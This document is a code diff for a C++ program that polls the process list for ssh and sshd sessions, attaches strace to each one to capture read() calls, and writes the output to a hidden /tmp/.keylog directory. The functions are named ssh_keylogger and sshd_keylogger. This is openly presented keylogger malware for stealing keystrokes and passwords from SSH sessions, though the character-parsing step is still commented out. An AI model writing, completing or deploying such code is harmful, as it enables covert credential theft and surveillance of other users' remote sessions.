@@ -1,9 +1,9 @@
 #include <iostream>
 #include <experimental/filesystem>
-#include <zconf.h>
 #include <cstring>
 #include <thread>
 #include <algorithm>
+#include <fcntl.h>
 
 namespace fs = std::experimental::filesystem;
 
@@ -55,6 +55,11 @@ std::tuple<std::string, uint16_t, std::string, std::string> split_proc_info(std:
     return splitted_proc_info;
 }
 
+//std::string parse_strace_output(std::string& output){
+//    auto last_qoma = output.find("\", 16384) ");
+//
+//}
+
 std::vector<Process> get_proc_list_of_ssh(){
     std::string command("ps -auxw");
     std::array<char, 128> buffer{};
@@ -64,7 +69,7 @@ std::vector<Process> get_proc_list_of_ssh(){
     FILE* pipe = popen(command.c_str(), "r");
     if (!pipe)
     {
-        std::cout << "Couldn't start command" << std::endl;
+        std::cout << "Couldn't 'ps -auxw' command" << std::endl;
         return {};
     }
     fgets(buffer.data(), 128, pipe);
@@ -84,13 +89,68 @@ std::vector<Process> get_proc_list_of_ssh(){
 }
 
 void ssh_keylogger(const uint16_t& pid){
-    // TODO: parser
     std::cout << "Handling process(outgoing SSH) " << pid << " by keylogger" << std::endl;
+    std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e read 2>&1";
+    FILE* pipe = popen(strace_cmd.c_str(), "r");
+    if (!pipe)
+    {
+        std::cout << "Couldn't 'strace' command" << std::endl;
+        return;
+    }
+    fs::path log_filename = "/tmp/.keylog";
+    log_filename /= std::to_string(pid) + "_ssh.log";
+    FILE *fd = std::fopen(log_filename.c_str(), "a");
+    if(!fd){
+        std::cout << "Log-file error: " << log_filename << std::endl;
+        return;
+    }
+    std::array<char, 256> buffer{};
+    while(fgets(buffer.data(), 256, pipe) != nullptr){
+        // tmplt to find: read(11, "s", 16384)
+        std::string data_from_strace{buffer.data()};
+        if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 16384") != std::string::npos &&
+                                                                    data_from_strace.find("= 1") != std::string::npos){
+//            std::string symbol = parse_strace_output(data_from_strace);
+//            std::fwrite(symbol.data(), 1, 1, fd);
+        } else {
+            std::fwrite("error", 1, 6, fd);
+        }
+    }
+    auto returnCode = pclose(pipe);
+    std::fclose(fd);
+
 }
 
 void sshd_keylogger(const uint16_t& pid){
-    // TODO: parser
     std::cout << "Handling process(incoming SSH) " << pid << " by keylogger" << std::endl;
+    std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e read 2>&1";
+    FILE* pipe = popen(strace_cmd.c_str(), "r");
+    if (!pipe)
+    {
+        std::cout << "Couldn't 'strace' command" << std::endl;
+        return;
+    }
+    fs::path log_filename = "/tmp/.keylog";
+    log_filename /= std::to_string(pid) + "_sshd(inc).log";
+    FILE *fd = std::fopen(log_filename.c_str(), "a");
+    if(!fd){
+        std::cout << "Log-file error: " << log_filename << std::endl;
+        return;
+    }
+    std::array<char, 256> buffer{};
+    while(fgets(buffer.data(), 256, pipe) != nullptr){
+        // tmplt to find: read(11, "s", 16384)
+        std::string data_from_strace{buffer.data()};
+        if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 16384") != std::string::npos &&
+                                                                    data_from_strace.find("= 1") != std::string::npos){
+//            std::string symbol = parse_strace_output(data_from_strace);
+//            std::fwrite(symbol.data(), 1, 1, fd);
+        } else {
+            std::fwrite("error", 1, 6, fd);
+        }
+    }
+    auto returnCode = pclose(pipe);
+    std::fclose(fd);
 }
 
 void check_ps(std::vector<uint16_t>& procs_in_monitoring){
@@ -100,7 +160,6 @@ void check_ps(std::vector<uint16_t>& procs_in_monitoring){
             auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
             if(it == procs_in_monitoring.end()){
                 procs_in_monitoring.emplace_back(proc.get_pid());
-                // TODO: parser
                 std::thread sshd_keylog(sshd_keylogger, proc.get_pid());
                 sshd_keylog.detach();
             }
@@ -109,7 +168,6 @@ void check_ps(std::vector<uint16_t>& procs_in_monitoring){
             auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
             if(it == procs_in_monitoring.end()){
                 procs_in_monitoring.emplace_back(proc.get_pid());
-                // TODO: parser
                 std::thread ssh_keylog(ssh_keylogger, proc.get_pid());
                 ssh_keylog.detach();
             }
@@ -118,13 +176,14 @@ void check_ps(std::vector<uint16_t>& procs_in_monitoring){
 }
 
 int main() {
-
     const fs::path path_to_log = "/tmp/.keylog";
-    int64_t sleep_time = 3;
+    int64_t sleep_time = 10;
     std::error_code er;
-    if(fs::exists(path_to_log, er)){
+    if(!fs::exists(path_to_log, er)){
         fs::create_directories(path_to_log);
+        std::cout << "DIR is created" << std::endl;
     }
+
     std::vector<uint16_t> procs_in_monitoring{};
     while(true){
         check_ps(procs_in_monitoring);
